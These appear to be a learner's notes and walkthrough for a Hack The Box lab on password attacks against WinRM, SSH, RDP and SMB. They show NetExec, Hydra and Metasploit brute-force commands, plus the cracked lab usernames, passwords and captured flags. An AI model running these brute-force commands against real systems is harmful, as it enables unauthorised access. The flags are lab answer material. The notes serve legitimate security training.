## WinRM
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems.
By default, WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).

A handy tool that we can use for our password attacks is [NetExec](https://github.com/Pennyw0rth/NetExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://www.netexec.wiki/) for this tool to become familiar with it.

#### NetExec
#### NetExec Menu Options
```shell
netexec -h
```

#### NetExec Protocol-Specific Help
Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.

```shell
netexec smb -h
```
#### NetExec Usage
The general format for using NetExec is as follows:

```shell
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
As an example, this is what attacking a WinRM endpoint might look like:

```shell-
netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM 10.129.42.197 5985  NONE [*] None (name:10.129.42.197) (domain:None)
WINRM 10.129.42.197 5985  NONE [*] http://10.129.42.197:5985/wsman
WINRM 10.129.42.197 5985  NONE [+] None\user:password (Pwn3d!)
```

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

#### Evil-WinRM
#### Evil-WinRM Usage
```shell
evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell
evil-winrm -i 10.129.42.197 -u user -p password
```
If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

## SSH
[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

#### Symmetric Encryption
Symmetric encryption uses the `same key` for encryption and decryption.

#### Asymmetric Encryption
Asymmetric encryption uses `two keys`: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key.

#### Hashing
The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.


#### Hydra - SSH
```shell
hydra -L user.list -P password.list ssh://10.129.42.197
```


## Remote Desktop Protocol (RDP)
Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization.

#### Hydra - RDP
```shell
hydra -L user.list -P password.list rdp://10.129.42.197
```

#### xFreeRDP
```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```


## SMB
[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks.

#### Hydra - SMB
```shell
hydra -L user.list -P password.list smb://10.129.42.197
```

#### Hydra - Error
```shell
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

#### Metasploit Framework
Bruteforce SMB wiht metasploit:
```shell
msf6 > use auxiliary/scanner/smb/smb_login
```

Now we can use `NetExec` again to view the available shares and what privileges we have for them.

#### NetExec - Display Shares
```shell
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```


#### Smbclient
```shell
smbclient -U user \\\\10.129.42.197\\SHARENAME
```


### Questions

Target: 10.129.202.136

1.  Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
2.  Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
3.  Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.


```shell
1:
> netexec winrm 10.129.202.136 -u username.list -p password.list
[+] WINSRV\john:november

> evil-winrm -u "john" -p "november" -i "10.129.202.136"
flag: HTB{That5Novemb3r}


2:
> evil-winrm -u "john" -p "november" -i "10.129.202.136"
PS > ls C:\Users
Administrator
cassie
chris
dennis
jerome
john

Save this new list to a user file.(We can avoid putting john because we already have his password)

> netexec ssh 10.129.202.136 -u users.txt -p password.list
[+] dennis:rockstar 

> ssh dennis@10.129.202.136
HTB{Let5R0ck1t}


3:

> netexec rdp 10.129.202.136 -u users.txt -p password.list
[+] WINSRV\cassie:12345678910
[+] WINSRV\chris:789456123

(Cassie not working for some reason)
> xfreerdp /v:10.129.202.136 /u:chris /p:789456123 /cert:ignore /drive:share,/workspace/CPTS/tmp
Here we make sure to share a folder in order to transfer flag file since clipboard does not work as expected.
```

![[Pasted image 20250929182252.png]]


```shell
Flag: HTB{R3m0t3DeskIsw4yT00easy}

4:
Looking for smb shares for user cassie:
> netexec smb 10.129.202.136 -u cassie -p 12345678910 --shares
> smbclient -U cassie \\\\10.129.202.136\\CASSIE
SMB > get flag.txt
HTB{S4ndM4ndB33 
```